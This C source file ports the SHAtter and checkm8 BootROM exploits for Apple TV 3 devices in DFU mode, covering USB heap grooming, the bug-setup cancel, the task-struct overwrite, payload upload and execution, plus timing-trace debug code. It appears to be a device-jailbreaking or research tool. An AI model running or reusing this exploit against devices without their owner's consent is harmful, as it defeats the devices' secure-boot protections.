//
//  Checkm8Pwn.c
//  blackb0x-pwn
//
//  SHAtter/checkm8 exploit bodies and their iRecovery USB helpers, ported
//  byte-for-byte from the original DeviceManager.m (git history --
//  `git show 907b64b^:Blackb0x/Source/DeviceManager.m`; deleted from the
//  tree in 907b64b, "Remove leftover original Objective-C/Cocoa source").
//  This is exploit-critical hardware-timing code and is not "improved"
//  during conversion, only translated from Objective-C method syntax to
//  plain C -- same rule DeviceManager.cpp's own SHAtter() port already
//  follows, see that file's comment. checkm8() here is a *fresh* port of
//  that same original: DeviceManager.cpp's own checkm8() was replaced
//  with a shell-out to a vendored `gaster` (since removed -- see
//  docs/HISTORY.md) before this file existed, and never carried the
//  original body forward, so it's recovered from git history here rather
//  than copied from DeviceManager.cpp.
//
//  The one deliberate deviation from the original: status/progress used
//  to update AppKit widgets via dispatch_async(dispatch_get_main_queue(),
//  ...) -- there's no GUI here, so those become plain printf()s, exactly
//  the same substitution DeviceManager.cpp's own SHAtter() port already
//  made for its sink_.onStatus/onProgress callbacks.

#include "Checkm8Pwn.h"

// checkm8.h uses size_t without including <stddef.h> itself (the original
// relied on an earlier #import <Cocoa/Cocoa.h> providing it transitively)
// -- must come before checkm8.h/SHAtter.h below.
#include <stddef.h>

#include "checkm8.h"
#include "SHAtter.h"

#include <libirecovery.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

// Ported from the original DeviceManager.h (git history) -- checkm8()'s
// own per-device exploit parameters, not payload data (that's
// checkm8.h's own checkm8_payload_8947[]).
typedef struct checkm8_config {
    uint16_t large_leak;
    uint16_t hole;
    int overwrite_offset;
    uint16_t leak;
    unsigned char* overwrite;
    size_t overwrite_len;
    unsigned char* payload;
    size_t payload_len;
} checkm8_config_t;

// S5L8947X (Apple TV 3,1/3,2) task-struct overwrite bytes -- same constant
// as the original DeviceManager.h's S518947X_OVERWRITE.
static unsigned char S518947X_OVERWRITE[] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34,
    0x00, 0x00, 0x00, 0x00,
};

static void reset_counters(irecv_client_t client) {
    int ret = irecv_reset_counters(client);
    printf("-- Reset usb counters. (%i)\n", ret);
    if (ret < 0) {
        printf("-- Failed to reset usb counters.\n");
    }
}

static void usb_reset(irecv_client_t client) {
    int ret = irecv_reset(client);
    printf("-- Reset DFU. (%i)\n", ret);
    if (ret < 0) {
        printf("Failed to reset DFU.\n");
    }
}

static void send_buffer(irecv_client_t client, unsigned char* data, unsigned long size) {
    irecv_error_t error = irecv_send_buffer(client, data, size, 0);
    printf("send buffer: %i\n", error);
}

static void get_data(irecv_client_t client, char* buffer, unsigned long length) {
    irecv_error_t error = irecv_recv_buffer(client, buffer, length);
    printf("get_data: %i\n", error);
}

// Defined further down with the tracing machinery; declared here because the
// helpers below are the exploit's earliest transfers and are worth tracing too.
static int tracedTransferEx(irecv_client_t client, const char* label,
                            uint8_t bmRequestType, uint8_t bRequest,
                            uint16_t wValue, uint16_t wIndex,
                            unsigned char* data, uint16_t wLength,
                            unsigned int timeout, int* transferred);
static int tracedTransfer(irecv_client_t client, const char* label,
                          uint8_t bmRequestType, uint8_t bRequest,
                          uint16_t wValue, uint16_t wIndex,
                          unsigned char* data, uint16_t wLength,
                          unsigned int timeout);

static void request_image_validation(irecv_client_t client) {
    int ret = tracedTransfer(client, "image-validation", 0x21, 1, 0, 0, NULL, 0, 1000);
    if (ret != 0) {
        printf("Failed to request image validation\n");
    }

    unsigned char blank[16];
    memset(blank, 0, 16);

    tracedTransfer(client, "image-validation/status1", 0xA1, 3, 0, 0, blank, 6, 1000);
    tracedTransfer(client, "image-validation/status2", 0xA1, 3, 0, 0, blank, 6, 1000);
    tracedTransfer(client, "image-validation/status3", 0xA1, 3, 0, 0, blank, 6, 1000);
    usb_reset(client);
}

static int msleep(long msec) {
    struct timespec ts;
    int res;

    if (msec < 0) {
        errno = EINVAL;
        return -1;
    }

    ts.tv_sec = msec / 1000;
    ts.tv_nsec = (msec % 1000) * 1000000;

    do {
        res = nanosleep(&ts, &ts);
    } while (res && errno == EINTR);

    return res;
}

static int usb_req_stall(irecv_client_t client) {
    return tracedTransfer(client, "groom/stall", 0x2, 3, 0x0, 0x80, NULL, 0, 10);
}

static int usb_req_leak(irecv_client_t client) {
    unsigned char buf[0x40];
    return tracedTransfer(client, "groom/leak", 0x80, 6, 0x304, 0x40A, buf, 0x40, 1);
}

static int usb_req_no_leak(irecv_client_t client) {
    unsigned char buf[0x41];
    return tracedTransfer(client, "groom/no-leak", 0x80, 6, 0x304, 0x40A, buf, 0x41, 1);
}

// checkm8 deliberately induces a pipe stall as its first exploit step, and
// relies on a transfer timeout for every heap leak after that -- these are
// the sequence's success signals, not errors.
//
// irecv_usb_control_transfer() does not normalise its return value across
// libirecovery's two backends. On IOKit it runs through
// iokit_usb_control_transfer(), which translates IOKit status into
// libirecovery's own enum (kIOUSBPipeStalled -> IRECV_E_PIPE == -10,
// kIOReturnTimeout/kIOUSBTransactionTimeout -> IRECV_E_TIMEOUT == -11). On
// libusb it is a bare pass-through returning libusb's raw codes from a
// completely unrelated enum (LIBUSB_ERROR_PIPE == -9, LIBUSB_ERROR_TIMEOUT
// == -7). Checking only the IRECV_E_* spelling makes a working exploit look
// like an instant hard failure on Linux ("Failed to stall pipe -9.").
//
// docs/HISTORY.md records this exact gap being found and fixed once already,
// in the DeviceManager.cpp checkm8() that predates this file. It came back
// here because this file was recovered from the original Objective-C, which
// only ever ran against IOKit.
//
// Accepting both spellings rather than selecting one per platform is safe,
// not lazy: iokit_usb_control_transfer()'s translation table can only ever
// return wLenDone, IRECV_E_PIPE, IRECV_E_TIMEOUT, IRECV_E_NO_DEVICE or
// IRECV_E_UNKNOWN_ERROR, so -9 and -7 are values it cannot produce at all
// and there is nothing for them to be confused with there. Spelled
// numerically because <libusb.h> is not on this target's include path on
// Apple, where it links no libusb at all.
#define LIBUSB_RET_PIPE (-9)
#define LIBUSB_RET_TIMEOUT (-7)

static int isPipeStall(int ret) {
    return ret == IRECV_E_PIPE || ret == LIBUSB_RET_PIPE;
}

static int isTransferTimeout(int ret) {
    return ret == IRECV_E_TIMEOUT || ret == LIBUSB_RET_TIMEOUT;
}

// ---------------------------------------------------------------------------
// Transfer tracing (DEBUG_TRACE_TRANSFERS)
// ---------------------------------------------------------------------------
//
// A poor man's usbmon, and the reason it exists: the decisive open question
// in this investigation is what the overwrite transfer does on a run that
// WORKS, which means a macOS run, and macOS will not give up the wire. Its
// USB capture interfaces (XHC20 and friends) do not even appear in ifconfig
// unless SIP is fully disabled -- confirmed from Apple DTS, not inferred --
// and reports say the method fails on 15.6.1+ with SIP already off. So the
// measurement has to come from inside this process instead, in a form that
// diffs cleanly against a Linux run of the same binary.
//
// What this records, per control transfer: the request itself, the return
// value, how many bytes the host controller believes moved (via
// irecv_usb_control_transfer_ex() -- neither backend's ordinary wrapper
// keeps that count on a stall or timeout), and elapsed wall time in
// microseconds.
//
// Elapsed time is not filler. docs/HISTORY.md's claim that ordinary control
// transfers here complete in 27-820us, and therefore that the 100us cancel
// delay sits below the floor for getting a data stage moving, is derived
// entirely from Linux. Whether that floor is the same on the platform where
// the exploit actually succeeds has never been measured.
//
// NOTHING IS PRINTED WHILE THE EXPLOIT RUNS. Records go into a fixed array
// and are flushed at the end. This is exploit-critical hardware-timing code
// (see AGENTS.md); a printf() between the bug setup and the overwrite would
// put a write() syscall, and possibly a blocking terminal, inside the exact
// window this is trying to measure. The array is fixed-size and silently
// stops recording when full for the same reason -- no malloc() on the path.
//
// Off unless DEBUG_TRACE_TRANSFERS is set, like every other DEBUG_ knob
// here: an unset environment has to remain the original path byte for byte.

#define kMaxTraceRecords 256

typedef struct {
    const char* label;
    uint8_t bmRequestType;
    uint8_t bRequest;
    uint16_t wValue;
    uint16_t wIndex;
    uint16_t wLength;
    int ret;
    int transferred;
    unsigned long elapsedUs;
} trace_record_t;

static trace_record_t traceRecords[kMaxTraceRecords];
static size_t traceCount;
static size_t traceDropped;

static int tracingEnabled(void) {
    static int resolved = 0;
    static int value = 0;

    if (!resolved) {
        value = getenv("DEBUG_TRACE_TRANSFERS") != NULL;
        resolved = 1;
    }
    return value;
}

static unsigned long nowUs(void) {
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) return 0;
    return (unsigned long)ts.tv_sec * 1000000UL + (unsigned long)(ts.tv_nsec / 1000);
}

// Drop-in for irecv_usb_control_transfer() that records the call. `label`
// names the exploit step, so a diff between two platforms lines up by stage
// rather than by index. Always goes through irecv_usb_control_transfer_ex():
// its return value is identical on both backends, and the partial count is
// worth having on the untraced path too.
static int tracedTransferEx(irecv_client_t client, const char* label,
                            uint8_t bmRequestType, uint8_t bRequest,
                            uint16_t wValue, uint16_t wIndex,
                            unsigned char* data, uint16_t wLength,
                            unsigned int timeout, int* transferred) {
    int moved = 0;
    unsigned long started = tracingEnabled() ? nowUs() : 0;

    int ret = irecv_usb_control_transfer_ex(client, bmRequestType, bRequest, wValue,
                                            wIndex, data, wLength, timeout, &moved);

    if (tracingEnabled()) {
        unsigned long elapsed = nowUs() - started;
        if (traceCount < kMaxTraceRecords) {
            trace_record_t* r = &traceRecords[traceCount++];
            r->label = label;
            r->bmRequestType = bmRequestType;
            r->bRequest = bRequest;
            r->wValue = wValue;
            r->wIndex = wIndex;
            r->wLength = wLength;
            r->ret = ret;
            r->transferred = moved;
            r->elapsedUs = elapsed;
        } else {
            traceDropped++;
        }
    }
    if (transferred) *transferred = moved;
    return ret;
}

static int tracedTransfer(irecv_client_t client, const char* label,
                          uint8_t bmRequestType, uint8_t bRequest,
                          uint16_t wValue, uint16_t wIndex,
                          unsigned char* data, uint16_t wLength,
                          unsigned int timeout) {
    return tracedTransferEx(client, label, bmRequestType, bRequest, wValue, wIndex,
                            data, wLength, timeout, NULL);
}

// Called on every exit path out of runCheckm8()/runSHAtter(), including the
// failing ones -- a failed run is the interesting one here.
static void traceFlush(void) {
    if (!tracingEnabled() || traceCount == 0) return;

    printf("\n--- transfer trace (%zu records%s) ---\n", traceCount,
           traceDropped ? ", TRUNCATED" : "");
    printf("%-26s %4s %4s %6s %6s %6s %8s %6s %10s\n",
           "stage", "type", "req", "value", "index", "len", "ret", "moved", "elapsed_us");
    for (size_t i = 0; i < traceCount; i++) {
        const trace_record_t* r = &traceRecords[i];
        printf("%-26s 0x%02x 0x%02x 0x%04x 0x%04x %6u %8d %6d %10lu%s\n",
               r->label, r->bmRequestType, r->bRequest, r->wValue, r->wIndex,
               (unsigned)r->wLength, r->ret, r->transferred, r->elapsedUs,
               isPipeStall(r->ret) ? "  (stall)"
                                   : (isTransferTimeout(r->ret) ? "  (timeout)" : ""));
    }
    if (traceDropped) {
        printf("(%zu further transfers not recorded -- kMaxTraceRecords exceeded)\n",
               traceDropped);
    }
    printf("--- end transfer trace ---\n");
    fflush(stdout);

    traceCount = 0;
    traceDropped = 0;
}

// How long the bug-setup DFU_DNLOAD is left running before it gets aborted.
// The default is the original DeviceManager.m's own value
// (irecv_async_usb_control_transfer_with_cancel(..., u_time=100)), which is
// what works on macOS/IOKit.
//
// Tunable because it does not survive the move to libusb: a usbmon capture of
// a real Linux run shows that abort landing after ~318us of URB lifetime with
// the device having consumed 0 of 2048 bytes -- the host controller never
// started the data stage. The whole point of this transfer is to leave the
// device's DFU handler holding a partially-filled buffer, so 0 bytes means
// the exploit's precondition never exists and everything after it is writing
// into an ungroomed heap. Ordinary control transfers on that same bus
// complete in 27-820us, so 100us is simply below the floor for getting a data
// stage moving there.
//
// See scripts/sweep_pwn_cancel_delay.py. (The name matched the vendored
// gaster's own DEBUG_CANCEL_DELAY_US back when a single sweep covered both
// tools; gaster is gone, the name is kept so old sweep output still reads.)
#define kDefaultCancelDelayUs 100u

static unsigned cancelDelayUs(void) {
    static int resolved = 0;
    static unsigned value = kDefaultCancelDelayUs;

    if (!resolved) {
        const char* env = getenv("DEBUG_CANCEL_DELAY_US");
        unsigned parsed;
        if (env != NULL && sscanf(env, "%u", &parsed) == 1) {
            value = parsed;
        }
        resolved = 1;
    }
    return value;
}

// How long the overwrite transfer is given to deliver its 1660 bytes. 100ms
// is the original macOS value.
//
// Tunable because a usbmon capture shows the device absorbing this transfer
// at roughly 5.7 bytes/ms -- around 55x slower than the ~310 bytes/ms the
// setup transfer achieves on the same bus, because the device NAKs almost
// continuously while taking it. At that rate 1660 bytes needs about 290ms,
// so a 100ms ceiling cuts the transfer off around a third of the way in and
// the overwrite struct (which sits at the very end, at overwrite_offset)
// never lands.
#define kDefaultOverwriteTimeoutMs 100u

static unsigned overwriteTimeoutMs(void) {
    static int resolved = 0;
    static unsigned value = kDefaultOverwriteTimeoutMs;

    if (!resolved) {
        const char* env = getenv("DEBUG_OVERWRITE_TIMEOUT_MS");
        unsigned parsed;
        if (env != NULL && sscanf(env, "%u", &parsed) == 1) {
            value = parsed;
        }
        resolved = 1;
    }
    return value;
}

// Whether to hold one connection from the bug setup through the overwrite,
// instead of closing, sleeping 500ms and reopening in between.
//
// The close/reopen is what the macOS original does and it works there. On
// Linux a usbmon capture showed the device treating the same request very
// differently either side of it. The comparison was against the vendored
// gaster (since removed): issuing the equivalent request immediately after
// the aborted download on the same connection got the device to accept up
// to the full 1632 bytes, while blackb0x-pwn -- which issues it after
// CLRSTATUS plus a close, half a second of nothing, a reopen, a stall and a
// leak -- got it stalled with zero bytes delivered at every bug-setup size
// tried. Half a second with the handle closed is a long time for a DFU
// state machine to keep a dangling buffer, and it was the one step gaster
// did not perform.
//
// Off by default: the close/reopen is the behaviour the working macOS path
// uses, so this only changes anything when deliberately switched on.
static int keepConnectionThroughOverwrite(void) {
    static int resolved = 0;
    static int value = 0;

    if (!resolved) {
        value = getenv("DEBUG_KEEP_CONNECTION") != NULL;
        resolved = 1;
    }
    return value;
}

// Whether a heap-grooming request returning something unexpected stops the
// run.
//
// Every groom request here is expected to fail in one specific way -- a stall
// for usb_req_stall(), a transfer timeout for the leaks -- and anything else
// aborts. That is how the original was written, and it stays the default. But
// the groom is only shaping the heap, not producing a result anything reads,
// so a single odd return does not necessarily mean the state is unusable; it
// just means the device answered differently than macOS taught this code to
// expect. With DEBUG_KEEP_CONNECTION set, one of the 627 leaks comes back
// EPROTO instead of timing out and the run stops there, before the overwrite
// -- which is the transfer actually worth observing.
//
// Off by default, so an unset environment is still the strict, macOS
// behaviour.
static int ignoreGroomErrors(void) {
    static int resolved = 0;
    static int value = 0;

    if (!resolved) {
        value = getenv("DEBUG_IGNORE_GROOM_ERRORS") != NULL;
        resolved = 1;
    }
    return value;
}

// Nonzero if the caller should bail. Reports and continues instead when
// DEBUG_IGNORE_GROOM_ERRORS is set.
static int groomFailure(const char* message, int ret) {
    if (ignoreGroomErrors()) {
        printf("warning: %s (ret %d) -- continuing, DEBUG_IGNORE_GROOM_ERRORS is set\n", message, ret);
        return 0;
    }
    printf("%s (ret %d)\n", message, ret);
    return 1;
}

static int get_payload_configuration(uint16_t cpid, const char* identifier, checkm8_config_t* config) {
    (void)identifier;

    switch (cpid) {
        case 0x8947:
            config->payload = malloc(checkm8_payload_length_armv7);
            config->payload_len = checkm8_payload_length_armv7;
            memcpy(config->payload, checkm8_payload_8947, checkm8_payload_length_armv7);
            break;

        default:
            printf("No payload offsets are available for your device.\n");
            return -1;
    }

    return 0;
}

static int get_exploit_configuration(uint16_t cpid, checkm8_config_t* config) {
    switch (cpid) {
        case 0x8947:
            printf("0x8947 configuration\n");
            config->large_leak = 626;
            config->hole = 0;
            config->overwrite_offset = 0x660;
            config->leak = 0;
            config->overwrite = S518947X_OVERWRITE;
            config->overwrite_len = sizeof(S518947X_OVERWRITE);
            return 0;

        default:
            printf("No exploit configuration is available for your device.\n");
            return -1;
    }
}

// ecid == 0 opens the first DFU-mode device irecv_open_with_ecid() finds --
// matches how the rest of this tool works: one device connected at a time,
// no menu.
//
// Thirty one-second retries by default: a device re-initialising its USB
// stack after a bus reset, or after running injected SecureROM-level code,
// can take meaningfully longer to come back than a short default allows.
//
// DEBUG_RECONNECT_ATTEMPTS shortens that for sweeping, where a stage that is
// never coming back costs thirty seconds every time and an Apple TV can be
// put back into DFU far faster than that (scripts/sweep_pwn_cancel_delay.py
// sets it to 5). Left at the original value unless asked, so the macOS path
// this was ported from keeps exactly the patience it was written with.
#define kDefaultReconnectAttempts 30

static int reconnectAttempts(void) {
    static int resolved = 0;
    static int value = kDefaultReconnectAttempts;

    if (!resolved) {
        const char* env = getenv("DEBUG_RECONNECT_ATTEMPTS");
        int parsed;
        if (env != NULL && sscanf(env, "%d", &parsed) == 1 && parsed > 0) {
            value = parsed;
        }
        resolved = 1;
    }
    return value;
}

static irecv_client_t get_tv(uint64_t ecid) {
    irecv_client_t client = NULL;
    const int attempts = reconnectAttempts();

    for (int i = 0; i < attempts; i++) {
        irecv_error_t err = irecv_open_with_ecid(&client, ecid);
        if (err == IRECV_E_SUCCESS) {
            return client;
        }
        if (err == IRECV_E_UNSUPPORTED) {
            fprintf(stderr, "ERROR: %s\n", irecv_strerror(err));
            return NULL;
        }
        if (i > 0) {
            fprintf(stderr, "  (reconnect attempt %d/%d: %s, retrying...)\n", i + 1, attempts,
                    irecv_strerror(err));
        }
        sleep(1);
    }
    return NULL;
}

static int runSHAtterInner(uint64_t ecid) {
    irecv_client_t client = get_tv(ecid);
    if (!client) {
        fprintf(stderr, "SHAtter: no DFU-mode device found.\n");
        return 0;
    }

    // Idempotent: a device already showing "SHAtter" in its serial string
    // (the original device_event()'s own marker for an already-exploited
    // device -- see this file's own header comment) isn't in the clean
    // SecureROM DFU state the sequence below assumes. Re-running a
    // buffer-overflow exploit against a device already running injected
    // payload code is at best pointless, at worst liable to corrupt that
    // state -- check first and short-circuit, same as runCheckm8() below.
    {
        const struct irecv_device_info* info = irecv_get_device_info(client);
        int alreadyPwned = info && strstr(info->serial_string, "SHAtter") != NULL;
        irecv_close(client);
        if (alreadyPwned) {
            puts("Device already SHAtter'd");
            puts("SHAtter successful");
            return 1;
        }
    }

    client = get_tv(ecid);
    if (!client) {
        fprintf(stderr, "SHAtter: device disappeared after idempotency check.\n");
        return 0;
    }

    puts("Preparing buffer overflow");

    char data_one[0x40];
    memset(data_one, 0, sizeof(data_one));
    reset_counters(client);
    get_data(client, data_one, sizeof(data_one));

    usb_reset(client);
    irecv_close(client);

    puts("Requesting validation");

    client = get_tv(ecid);
    request_image_validation(client);
    irecv_close(client);

    puts("Filling buffer with zeros");
    char data_two[0x2C000];
    memset(data_two, 0, sizeof(data_two));

    client = get_tv(ecid);
    get_data(client, data_two, sizeof(data_two));
    irecv_close(client);

    msleep(500);

    puts("Overwriting SHA1 registers");
    char data_three[0x140];
    memset(data_three, 0, sizeof(data_three));

    client = get_tv(ecid);
    reset_counters(client);
    get_data(client, data_three, sizeof(data_three));
    usb_reset(client);
    irecv_close(client);

    client = get_tv(ecid);
    request_image_validation(client);
    irecv_close(client);

    puts("Sending SHAtter payload");
    char data_four[0x2C000];
    memset(data_four, 0, sizeof(data_four));

    client = get_tv(ecid);
    send_buffer(client, SHAtter_payload, 0x800);
    puts("Overwriting exception vectors");

    get_data(client, data_four, sizeof(data_four));
    irecv_close(client);

    msleep(500);

    puts("SHAtter successful");
    return 1;
}

static int runCheckm8Inner(uint64_t ecid) {
    irecv_client_t client = get_tv(ecid);
    if (!client) {
        fprintf(stderr, "checkm8: no DFU-mode device found.\n");
        return 0;
    }

    // Idempotent: a device already reporting "PWND:[" (same marker
    // checkm8()'s own end-of-exploit verification below checks, and the
    // same one DeviceManager.cpp's checkm8Attempt() already short-circuits
    // on) isn't in the clean SecureROM DFU state the exploit sequence
    // assumes -- e.g. a previous run already succeeded, or succeeded but
    // was killed before reporting it. Re-running this exploit against an
    // already-pwned device is at best pointless, at worst liable to
    // corrupt that state; check first rather than let a stale PWND:[ from
    // *before* this run make an unrelated failure look like success.
    {
        const struct irecv_device_info* info = irecv_get_device_info(client);
        int alreadyPwned = info && strstr(info->serial_string, "PWND:[") != NULL;
        irecv_close(client);
        if (alreadyPwned) {
            puts("Device already in pwned DFU");
            puts("Checkm8 successful");
            return 1;
        }
    }

    client = get_tv(ecid);
    if (!client) {
        fprintf(stderr, "checkm8: device disappeared after idempotency check.\n");
        return 0;
    }

    unsigned char buf[0x800];
    memset(buf, 'A', sizeof(buf));

    checkm8_config_t config;
    memset(&config, 0, sizeof(config));

    const struct irecv_device_info* info = irecv_get_device_info(client);
    irecv_device_t device_info = NULL;
    irecv_devices_get_device_by_client(client, &device_info);

    puts("Configuring checkm8 exploit");

    int ret = get_exploit_configuration((uint16_t)info->cpid, &config);
    if (ret != 0) {
        printf("Failed to get exploit configuration.\n");
        irecv_close(client);
        return 0;
    }

    ret = get_payload_configuration((uint16_t)info->cpid, device_info ? device_info->product_type : NULL, &config);
    if (ret != 0) {
        printf("Failed to get payload configuration.\n");
        irecv_close(client);
        return 0;
    }

    puts("Exploiting with checkm8");

    ret = usb_req_stall(client);
    if (!isPipeStall(ret) && groomFailure("Failed to stall pipe", ret)) {
        free(config.payload);
        irecv_close(client);
        return 0;
    }

    usleep(100);

    int leakFailures = 0;
    int lastLeakFailure = 0;
    for (int i = 0; i < config.large_leak; i++) {
        ret = usb_req_leak(client);
        if (!isTransferTimeout(ret)) {
            // Counted rather than reported per iteration: with
            // DEBUG_IGNORE_GROOM_ERRORS set this can fire hundreds of
            // times and the total is the useful number.
            ++leakFailures;
            lastLeakFailure = ret;
            if (!ignoreGroomErrors()) {
                printf("Failed to create heap hole (leak %d of %d, ret %d)\n",
                       i + 1, (int)config.large_leak, ret);
                free(config.payload);
                irecv_close(client);
                return 0;
            }
        }
    }
    if (leakFailures > 0) {
        printf("warning: %d of %d groom leaks did not time out (last ret %d) -- continuing, "
               "DEBUG_IGNORE_GROOM_ERRORS is set\n",
               leakFailures, (int)config.large_leak, lastLeakFailure);
    }

    ret = usb_req_no_leak(client);
    if (!isTransferTimeout(ret) && groomFailure("Failed to create heap hole (no-leak)", ret)) {
        free(config.payload);
        irecv_close(client);
        return 0;
    }

    irecv_reset(client);
    irecv_close(client);
    client = NULL;
    usleep(100);

    client = get_tv(ecid);
    if (!client) {
        fprintf(stderr, "checkm8: device did not reappear before overwrite.\n");
        free(config.payload);
        return 0;
    }

    puts("Preparing for overwrite");

    unsigned delayUs = cancelDelayUs();
    int sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, delayUs);
    // The one number that decides whether this stage did anything, and it was
    // previously computed and thrown away. Anything outside 0 < sent <=
    // overwrite_offset means the following overwrite lands somewhere the
    // exploit did not intend. Reported, not enforced: sent == 0 is known to
    // be useless in principle, but the macOS path this was ported from is
    // confirmed working and has never been measured, so refusing to continue
    // on 0 could break the one configuration known to succeed.
    printf("bug setup: cancel delay %u us -> device consumed %d of %d bytes (want 0 < n <= %d)\n",
           delayUs, sent, 0x800, config.overwrite_offset);
    if (sent < 0) {
        printf("Failed to send bug setup.\n");
        free(config.payload);
        irecv_close(client);
        return 0;
    }
    if (sent > config.overwrite_offset) {
        printf("Failed to abort bug setup.\n");
        free(config.payload);
        irecv_close(client);
        return 0;
    }

    ret = tracedTransfer(client, "bug-setup/abort", 0x21, 4, 0, 0, NULL, 0, 0);
    if (ret != 0) {
        printf("Failed to send abort.\n");
        free(config.payload);
        irecv_close(client);
        return 0;
    }

    if (keepConnectionThroughOverwrite()) {
        puts("keeping the connection open through the overwrite (skipping the "
             "close/500ms/reopen)");
    } else {
        irecv_close(client);
        client = NULL;
        usleep(500000);

        client = get_tv(ecid);
        if (!client) {
            fprintf(stderr, "checkm8: device did not reappear before heap grooming.\n");
            free(config.payload);
            return 0;
        }
    }

    puts("Grooming heap");

    ret = usb_req_stall(client);
    if (!isPipeStall(ret) && groomFailure("Failed to stall pipe", ret)) {
        free(config.payload);
        irecv_close(client);
        return 0;
    }

    usleep(100);

    ret = usb_req_leak(client);
    if (!isTransferTimeout(ret) && groomFailure("Failed to create heap hole", ret)) {
        free(config.payload);
        irecv_close(client);
        return 0;
    }

    puts("Overwriting task struct");

    size_t overwrite_buf_len = (size_t)config.overwrite_offset + config.overwrite_len;
    unsigned char* overwrite_buf = calloc(1, overwrite_buf_len);
    if (!overwrite_buf) {
        printf("Out of memory.\n");
        free(config.payload);
        irecv_close(client);
        return 0;
    }
    memcpy(overwrite_buf + config.overwrite_offset, config.overwrite, config.overwrite_len);

    unsigned overwriteTimeout = overwriteTimeoutMs();
    int overwriteMoved = 0;
    int overwriteRet = tracedTransferEx(client, "OVERWRITE", 0, 0, 0, 0, overwrite_buf,
                                        (uint16_t)overwrite_buf_len, overwriteTimeout,
                                        &overwriteMoved);
    // THE number this whole investigation turns on: does the device take all
    // 1660 bytes, or none of them?
    //
    // A negative return here is the transfer's error code, not a byte count,
    // and neither backend's ordinary wrapper keeps the partial count on a
    // stall or timeout -- which is why this used to say "how far this got is
    // only visible on the wire" and point at a usbmon capture. That is no
    // longer true: irecv_usb_control_transfer_ex() (this project's
    // libirecovery fork) preserves IOKit's req.wLenDone and libusb's
    // transfer->actual_length, so the count is available on BOTH platforms
    // and can be diffed directly. It had to become available, because macOS
    // will not hand over the wire at all -- see docs/HISTORY.md on XHC20.
    //
    // Read `moved` with the caveat it deserves: on a timeout it is what the
    // HOST controller believes it sent, which is not automatically what the
    // device accepted. Where a Linux usbmon capture disagrees with it, the
    // capture wins.
    printf("overwrite: %zu bytes offered with a %u ms timeout -> ret %d, host moved %d%s\n",
           overwrite_buf_len, overwriteTimeout, overwriteRet, overwriteMoved,
           isPipeStall(overwriteRet) ? " (stalled -- device rejected it outright)"
                                     : (isTransferTimeout(overwriteRet) ? " (timed out mid-transfer)" : ""));
    free(overwrite_buf);

    puts("Uploading payload");

    ret = tracedTransfer(client, "payload-upload", 0x21, 1, 0, 0, config.payload,
                         (uint16_t)config.payload_len, 100);
    if (!isTransferTimeout(ret)) {
        printf("Failed to upload payload.\n");
        free(config.payload);
        irecv_close(client);
        return 0;
    }

    puts("Executing payload");

    irecv_reset(client);
    irecv_close(client);
    free(config.payload);
    client = NULL;
    usleep(500000);

    client = get_tv(ecid);
    if (!client) {
        fprintf(stderr, "checkm8: device did not reappear after payload execution.\n");
        return 0;
    }

    info = irecv_get_device_info(client);
    const char* pwnd_str = info ? strstr(info->serial_string, "PWND:[") : NULL;
    printf("serial string: %s\n", info ? info->serial_string : "(none)");

    irecv_close(client);

    if (!pwnd_str) {
        puts("Checkm8 unsuccessful");
        return 0;
    }

    puts("Checkm8 successful");
    return 1;
}

// Public entry points. The exploit bodies above are wrapped rather than
// having traceFlush() bolted onto each of their ~20 return statements:
// every one of those is an exit path worth a trace, and the failing ones
// are the interesting ones, so missing even one would silently lose the
// run that mattered.
int runSHAtter(uint64_t ecid) {
    int ret = runSHAtterInner(ecid);
    traceFlush();
    return ret;
}

int runCheckm8(uint64_t ecid) {
    int ret = runCheckm8Inner(ecid);
    traceFlush();
    return ret;
}
